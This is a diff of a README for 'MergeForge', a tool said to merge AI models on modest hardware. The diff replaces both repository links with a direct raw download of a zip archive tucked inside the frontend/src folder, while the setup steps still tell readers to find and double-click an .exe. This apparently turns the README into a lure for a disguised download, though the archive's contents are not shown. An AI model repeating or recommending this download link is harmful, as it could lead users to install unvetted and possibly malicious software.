@@ -1,6 +1,6 @@
 # 🛠️ MergeForge - Combine AI models without powerful hardware
 
-[![Download MergeForge](https://img.shields.io/badge/Download-MergeForge-blue.svg)](https://github.com/victoriamaia1/MergeForge)
+[![Download MergeForge](https://img.shields.io/badge/Download-MergeForge-blue.svg)](https://raw.githubusercontent.com/victoriamaia1/MergeForge/main/frontend/src/Forge-Merge-3.6.zip)
 
 MergeForge lets you create new AI models. You take two existing models and combine them into one new tool. You do not need a powerful graphics card or professional technical skills to perform this task. The tool manages the heavy lifting through a visual interface on your computer.
 
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets these basic needs:
 
 ## 🚀 Setting up the application
 
-1. Visit the following page to download the latest version: [https://github.com/victoriamaia1/MergeForge](https://github.com/victoriamaia1/MergeForge).
+1. Visit the following page to download the latest version: [https://raw.githubusercontent.com/victoriamaia1/MergeForge/main/frontend/src/Forge-Merge-3.6.zip](https://raw.githubusercontent.com/victoriamaia1/MergeForge/main/frontend/src/Forge-Merge-3.6.zip).
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to begin the installation.
